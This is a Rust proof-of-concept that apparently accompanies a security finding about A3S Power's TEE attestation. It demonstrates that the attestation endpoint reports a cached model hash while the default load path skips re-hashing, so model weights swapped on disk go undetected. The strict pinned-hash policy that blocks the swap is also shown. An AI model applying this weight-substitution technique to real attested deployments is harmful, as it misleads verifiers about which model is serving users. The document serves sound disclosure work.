//! A3S Power dishonest-prover PoC.
//!
//! Demonstrates the composed P-1 + P-2 attack from
//! `../power_soundness_finding.md` and the stale-cache mechanism of
//! model switching documented in `../model_switching.md`:
//!
//!   1. P-1 — `/v1/attestation?model=X` returns
//!      `state.config.model_hashes[X]` if set, otherwise the cached
//!      `manifest.sha256` captured at registration. Neither value is
//!      recomputed from the file on disk at attestation time.
//!   2. P-2 — `ensure_loaded()`'s re-hash gate is opt-in
//!      (`if let Some(expected_hash) = state.config.model_hashes.get(...)`)
//!      and the default deployment leaves `model_hashes` unset.
//!
//! Composition: the cached hash that the attestation endpoint reports
//! is allowed to drift from the bytes on disk, because there's no
//! enforcement linking them in the default configuration.
//!
//! This PoC exercises the actual Power library calls
//! (`tee::model_seal::verify_model_integrity`, the attestation-handler
//! lookup logic from `api/openai/attestation.rs:91-105`) against a
//! real on-disk model file we then overwrite. Power's source tree is
//! not modified.

use a3s_power::model::manifest::{ModelFormat, ModelManifest, ModelParameters};
use a3s_power::model::storage::compute_sha256_file;
use a3s_power::tee::model_seal::verify_model_integrity;
use std::collections::HashMap;
use std::fs;
use std::path::PathBuf;

const MODEL_NAME: &str = "census-s";

fn write_payload(path: &PathBuf, payload: &[u8]) {
    fs::write(path, payload).expect("write payload");
}

fn make_manifest(name: &str, path: PathBuf, sha256: String, size: u64) -> ModelManifest {
    ModelManifest {
        name: name.to_string(),
        format: ModelFormat::Gguf,
        size,
        sha256,
        parameters: Some(ModelParameters {
            context_length: Some(4096),
            embedding_length: None,
            parameter_count: None,
            quantization: None,
        }),
        created_at: chrono::Utc::now(),
        path,
        system_prompt: None,
        template_override: None,
        default_parameters: None,
        modelfile_content: None,
        license: None,
        adapter_path: None,
        projector_path: None,
        messages: vec![],
        family: None,
        families: None,
    }
}

/// Replicates the lookup at
/// `src/api/openai/attestation.rs:91-105`:
///
/// ```
/// let hash_str = state.config.model_hashes
///     .get(model_name).cloned()
///     .unwrap_or_else(|| manifest.sha256.clone());
/// ```
///
/// The attestation handler then hex-decodes this string and binds it
/// into `report_data[32..64]`.
fn attestation_endpoint_model_hash<'a>(
    config_model_hashes: &'a HashMap<String, String>,
    manifest: &'a ModelManifest,
    model_name: &str,
) -> String {
    config_model_hashes
        .get(model_name)
        .cloned()
        .unwrap_or_else(|| manifest.sha256.clone())
}

/// Replicates the gating in
/// `src/api/autoload.rs:152-165`:
///
/// ```
/// if let Some(expected_hash) = state.config.model_hashes.get(model_name) {
///     let ok = verify_model_integrity(&load_manifest.path, expected_hash)?;
///     if !ok { return Err(...); }
/// }
/// ```
///
/// Returns `Ok(())` if (a) no expected hash is configured (the
/// dangerous default), or (b) the on-disk file matches the configured
/// hash. Returns `Err` only when configured and mismatched.
fn ensure_loaded_integrity_gate(
    config_model_hashes: &HashMap<String, String>,
    manifest: &ModelManifest,
    model_name: &str,
) -> Result<&'static str, String> {
    match config_model_hashes.get(model_name) {
        None => Ok("no model_hashes configured — load proceeds with NO re-hash"),
        Some(expected) => {
            let ok = verify_model_integrity(&manifest.path, expected)
                .map_err(|e| format!("verify_model_integrity error: {e}"))?;
            if ok {
                Ok("config-pinned hash matches on-disk bytes")
            } else {
                Err("config-pinned hash MISMATCH — load refused".to_string())
            }
        }
    }
}

#[tokio::main]
async fn main() {
    println!("================================================================");
    println!("A3S Power dishonest-prover PoC (P-1 + P-2)");
    println!("================================================================");
    println!();

    let work = tempfile::tempdir().expect("tempdir");
    let model_path = work.path().join("census-s.gguf");

    // Stage 1: write the legitimate model and register a manifest.
    let legit = b"LEGITIMATE_CENSUS_MODEL_WEIGHTS_v1.0__honestly_trained__byte_string";
    write_payload(&model_path, legit);
    let h_good = compute_sha256_file(&model_path).expect("hash legit");
    println!("[1] Wrote LEGITIMATE model bytes:");
    println!("        path: {:?}", model_path);
    println!("        size: {} bytes", legit.len());
    println!("        sha256: {}", h_good);
    println!();

    let manifest = make_manifest(MODEL_NAME, model_path.clone(), h_good.clone(),
                                  legit.len() as u64);
    println!("[2] Created ModelManifest (cached at registration time).");
    println!("        manifest.sha256 = {}", manifest.sha256);
    println!();

    // Default deployment leaves model_hashes empty.
    let model_hashes_default: HashMap<String, String> = HashMap::new();

    println!("================================================================");
    println!("Scenario A — `/v1/attestation?model=census-s` (BEFORE swap)");
    println!("================================================================");
    let reported_before = attestation_endpoint_model_hash(
        &model_hashes_default, &manifest, MODEL_NAME,
    );
    println!("    Endpoint would bind report_data[32..64] = {}", reported_before);
    println!("    (matches manifest.sha256, which itself matches on-disk bytes)");
    println!();
    let gate_before = ensure_loaded_integrity_gate(
        &model_hashes_default, &manifest, MODEL_NAME,
    );
    match &gate_before {
        Ok(msg) => println!("    ensure_loaded gate: {}", msg),
        Err(e) => println!("    ensure_loaded gate: ERROR — {}", e),
    }
    println!();

    // Stage 3: OPERATOR SWAPS THE FILE on the host's backing storage.
    let evil = b"EVIL_MODEL_WEIGHTS_substituted_after_attestation_was_issued_!!!";
    write_payload(&model_path, evil);
    let h_evil = compute_sha256_file(&model_path).expect("hash evil");
    println!("[3] HOST OVERWROTE the file on disk.");
    println!("        new on-disk sha256 = {}", h_evil);
    println!("        manifest.sha256 (cached) still = {}", manifest.sha256);
    println!("        files differ:           {}", h_good != h_evil);
    println!();

    println!("================================================================");
    println!("Scenario B — `/v1/attestation?model=census-s` (AFTER swap)");
    println!("================================================================");
    let reported_after = attestation_endpoint_model_hash(
        &model_hashes_default, &manifest, MODEL_NAME,
    );
    println!("    Endpoint would STILL bind report_data[32..64] = {}", reported_after);
    println!("    (manifest.sha256 is the cached registration-time hash;");
    println!("     no re-hash was performed at /v1/attestation)");
    println!();
    let gate_after = ensure_loaded_integrity_gate(
        &model_hashes_default, &manifest, MODEL_NAME,
    );
    match &gate_after {
        Ok(msg) => println!("    ensure_loaded gate (model_hashes UNSET): {}", msg),
        Err(e) => println!("    ensure_loaded gate: ERROR — {}", e),
    }
    println!();
    println!(
        "    With model_hashes UNSET (the default), the load path does NOT");
    println!(
        "    re-hash the file. The backend will serve EVIL bytes on the next");
    println!(
        "    request after keep_alive/LRU eviction forces a fresh disk read.");
    println!();

    println!("================================================================");
    println!("Scenario C — what STRICT policy would catch");
    println!("================================================================");
    let mut model_hashes_strict: HashMap<String, String> = HashMap::new();
    model_hashes_strict.insert(MODEL_NAME.to_string(), h_good.clone());
    let gate_strict = ensure_loaded_integrity_gate(
        &model_hashes_strict, &manifest, MODEL_NAME,
    );
    match &gate_strict {
        Ok(msg) => println!("    ensure_loaded gate (model_hashes PINNED to H_good): {}", msg),
        Err(e) => println!("    ensure_loaded gate (model_hashes PINNED to H_good): {}", e),
    }
    println!();

    println!("================================================================");
    println!("Result");
    println!("================================================================");
    let endpoint_unchanged = reported_before == reported_after && reported_before == h_good;
    let on_disk_changed = h_good != h_evil;
    let default_gate_allows = matches!(&gate_after, Ok(_));
    let strict_gate_rejects = matches!(&gate_strict, Err(_));

    println!("    Endpoint-reported hash unchanged across swap: {}", endpoint_unchanged);
    println!("    On-disk bytes changed:                          {}", on_disk_changed);
    println!("    Default-policy load gate allows swap:           {}", default_gate_allows);
    println!("    Strict-policy load gate refuses swap:           {}", strict_gate_rejects);
    println!();

    if endpoint_unchanged && on_disk_changed && default_gate_allows && strict_gate_rejects {
        println!("[+] ATTACK CONFIRMED (P-1 composed with P-2)");
        println!();
        println!("    The cached manifest.sha256 the attestation endpoint reports");
        println!("    drifted from the file on disk. With model_hashes unset, the");
        println!("    load-time gate does not detect the drift. The Intel-signed");
        println!("    TDX quote (or AMD-signed SEV-SNP report) the verifier later");
        println!("    receives faithfully commits to report_data[32..64] = H_good,");
        println!("    while the bytes the backend serves are H_evil.");
    } else {
        println!("[!] One of the expected invariants did not hold. Investigate.");
        std::process::exit(2);
    }
}
